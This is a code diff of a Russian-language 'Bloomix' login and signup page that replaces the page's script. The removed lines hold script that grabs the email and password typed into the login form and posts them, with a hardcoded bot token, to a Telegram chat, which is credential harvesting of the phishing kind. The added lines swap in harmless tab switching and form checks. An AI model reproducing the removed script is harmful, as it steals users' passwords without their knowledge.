@@ -254,57 +254,71 @@
     </div>
   </div>
 
-  <script>
-const TELEGRAM_BOT_TOKEN = '8537379109:AAHmXwBtaNVceuUP3L2CZZ1LnxIPoI4sOug';
-const TELEGRAM_CHAT_ID = '8537379109';
-
-async function sendToTelegram(message) {
-  const url = `https://telegram.org{8537379109:AAHmXwBtaNVceuUP3L2CZZ1LnxIPoI4sOug}/sendMessage`;
+ <script>
+  // Переключение вкладок
+  function switchToSignup() {
+    document.getElementById('login-form').style.display = 'none';
+    document.getElementById('signup-form').style.display = 'block';
+    document.getElementById('login-tab').classList.remove('active');
+    document.getElementById('signup-tab').classList.add('active');
+  }
   
-  try {
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    });
-  } catch (error) {
-    console.error('Ошибка отправки:', error);
+  function switchToLogin() {
+    document.getElementById('signup-form').style.display = 'none';
+    document.getElementById('login-form').style.display = 'block';
+    document.getElementById('signup-tab').classList.remove('active');
+    document.getElementById('login-tab').classList.add('active');
   }
-}
-
-async function login() {
-  const email = document.getElementById('login-email').value;
-  const pass = document.getElementById('login-password').value;
-
-  if (email && pass) {
-    const text = `<b>🔑 Вход в Bloomix:</b>\n📧 Email: <code>${email}</code>\n🔒 Пароль: <code>${pass}</code>`;
-    await sendToTelegram(text);
+  
+  // Привязка кликов к табам (добавьте это, чтобы вкладки сверху работали)
+  document.getElementById('login-tab').onclick = switchToLogin;
+  document.getElementById('signup-tab').onclick = switchToSignup;
+  
+  function login() {
+    const email = document.getElementById('login-email').value;
+    const pass = document.getElementById('login-password').value;
+  
+    if (email && pass) {
+      console.log('Вход выполнен:', email);
+      // Перенаправление
+      window.location.href = 'index.html';
+    } else {
+      alert('Пожалуйста, заполните все поля для входа');
+    }
+  }
+  
+  function signup() {
+    const name = document.getElementById('signup-name').value;
+    const email = document.getElementById('signup-email').value;
+    const pass = document.getElementById('signup-password').value;
+    const confirmPass = document.getElementById('signup-confirm').value;
+    const terms = document.getElementById('terms').checked;
+  
+    // Проверки
+    if (!name || !email || !pass) {
+      alert('Заполните все обязательные поля');
+      return;
+    }
+  
+    if (pass !== confirmPass) {
+      alert('Пароли не совпадают!');
+      return;
+    }
+  
+    if (!terms) {
+      alert('Необходимо принять условия использования');
+      return;
+    }
+  
+    // Сохраняем имя в память браузера
+    localStorage.setItem('userName', name);
     
-    // После отправки перенаправляем
-    document.location.href = 'index.html';
-  } else {
-    alert('Пожалуйста, заполните все поля');
+    console.log('Регистрация успешна:', name);
+    
+    // Перенаправление
+    window.location.href = 'index.html';
   }
-}
-
-async function signup() {
-  const name = document.getElementById('signup-name').value;
-  // ... твои проверки ...
-
-  if (name) {
-    // СОХРАНЯЕМ ИМЯ В ПАМЯТЬ БРАУЗЕРА
-    localStorage.setItem('userName', name); 
-
-    // Дальше твой код отправки в телеграм и переход
-    await sendToTelegram(`Новая регистрация: ${name}`);
-    document.location.href = 'index.html'; // или index.html
-  }
-}
-
   </script>
+  
 </body>
 </html>
